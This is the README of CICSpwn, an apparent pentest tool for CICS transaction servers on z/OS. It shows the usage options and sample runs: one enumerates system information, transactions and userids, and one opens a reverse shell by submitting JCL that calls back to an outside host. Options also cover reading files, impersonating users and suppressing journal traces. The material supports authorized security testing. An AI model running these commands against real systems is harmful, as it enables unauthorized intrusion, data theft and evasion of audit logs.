# CICSpwn
## Description  
CICSpwn is a tool to pentest CICS Transaction servers on z/OS.

## Features    
* Get general information about CICS and the underlying z/OS  
  * List available IBM supplied transactions
  * Get active sessions and userids
  * Get path (HLQ) of files and libraries
  * Check if CICS is using RACF/ACF2/TopSecret   
* Read files created by the application 
* Remotely execute code using Spoolopen and TDqueue
## Usage
```
$python cicspwn.py -h
usage: cicspwn.py [-h] [-a APPLID] [-i] [-t] [-f] [-p PATTERN] [-U USERID]
                  [-P PASSWORD] [--get-file FILENAME]
                  [--enable-trans ENA_TRANS] [-q] [-u] [-g SURROGAT_USER]
                  [-s SUBMIT] [--queue QUEUE] [-l LHOST] [-j JCL]
                  IP PORT

CicsPwn: a tool to pentest CICS transaction servers on z/OS

positional arguments:
  IP                    The z/OS Mainframe IP or Hostname
  PORT                  CICS/VTAM server Port

optional arguments:
  -h, --help            show this help message and exit
  -a APPLID, --applid APPLID
                        CICS ApplID on VTAM, default is CICS
  -i, --info            Gather information about a CICS region
  -t, --trans           Get all installed transactions on a CICS TS server
  -f, --files           List all installed files a on TS CICS
  -p PATTERN, --pattern PATTERN
                        Specify a pattern of a files/transaction to get
                        (default is "*")
  -U USERID, --userid USERID
                        Specify a userid to use on CICS
  -P PASSWORD, --password PASSWORD
                        Specify a password for the userid
  --get-file FILENAME   Get the content of a file. It attempts to change the
                        status of the file if it's not enabled, opened or
                        readable
  --enable-trans ENA_TRANS
                        Enable a single transaction
  -q, --quiet           Remove Trailing and journal before performing any
                        action
  -u, --userids         Scrape userids found in different menus
  -g SURROGAT_USER, --surrogat SURROGAT_USER
                        Checks wether you can impersonate another user when
                        submitting a job
  -s SUBMIT, --submit SUBMIT
                        Submit JCL to CICS server. Specify:
                        dummy,reverse,custom (need -j option),cicsshell
  --queue QUEUE         Provides the name of the TD queue to submit a JOB
  -l LHOST, --lhost LHOST
                        Remote server to call back to for reverse shell
                        (host:port)
  -j JCL, --jcl JCL     Custom JCL file to provide
```
## Prerequisites
3270 Python library [py3270](https://pypi.python.org/pypi/py3270/0.2.0)

## Getting general information
```
root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -i
[+] Connecting to target 192.168.1.209:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Getting information about CICS server (APPLID: CICS)
	[*] CICS TS Version 3.2
[+] Available IBM supplied transactions: 
	[*] CEMT
	[*] CECI
	[*] CEDA
	[*] CEDF
[+] General system information: 
	[*] Userid: CICSUSER
	[*] Sysid: S650
	[*] LU session name: LCL704
	[*] language: E
	[*] Files HLQ:	CICS650.**
	[*] Library path:	DFH320.CICS.**
[+] Active users
	[*] CICSUSER
	[*] CICSUSER
[+] JCL Submission
	[*] Access to internal spool is apparently available
	[*] Transiant queue to access spool is apparently available
		[*] When submitting a job, provide the option --inreader=IRDR
[+] Access control
	[*] User CICSUSER authorized to submit JOBS
```
## Reverse shell using CICS
```
root@kali:~/cics# python cicspwn.py -a CICS 192.168.1.209 23 -s reverse -l 192.168.1.16:4445
[+] Connecting to target 192.168.1.209:23
[*] Access to CICS Terminal is possible with APPID CICS
[+] Setting the current terminal to mixed case
[*] Got TerminalID L702
[*] Current terminal is NOW mixed case
[+] Spool not available apparently, trying via TDQueue
[+] Writing to the internal TDQueue
	[*] JCL Written to TDqueue, it should be executed any second

```

## Copyright and license  
cicsPWN is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.  
CICSpwn is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  
See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with nmaptocsv. If not, see http://www.gnu.org/licenses/.

## Credit
The REXX code of the reverse shell was mainly inspired by the work of [@mainframed767](https://github.com/mainframed/Mainframed)

## Contact
Ayoub ELAASSAL ayoul3.zos at gmail dot com
